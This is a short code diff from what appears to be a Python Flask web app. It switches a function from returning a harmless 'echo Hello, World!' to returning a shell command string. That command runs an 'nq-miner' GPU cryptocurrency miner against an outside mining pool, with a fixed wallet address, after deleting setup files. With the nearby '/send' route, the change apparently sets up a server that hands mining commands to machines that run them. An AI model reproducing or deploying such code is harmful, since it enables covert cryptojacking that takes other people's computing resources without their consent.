@@ -15,7 +15,7 @@ rm nq-nimer-linux.zip
 rm ./nq-miner/start_gpu.sh
 ./nq-miner/nq-miner -t cuda -a "NQ718S9KEYU4VCBV4SB5PX73CJJJ3NCV9CM3" -n "ixelizm" -p pool.acemining.co:8443
 '
-  return "echo Hello, World!"
+  return command
 
 @app.route("/send")
 def send():
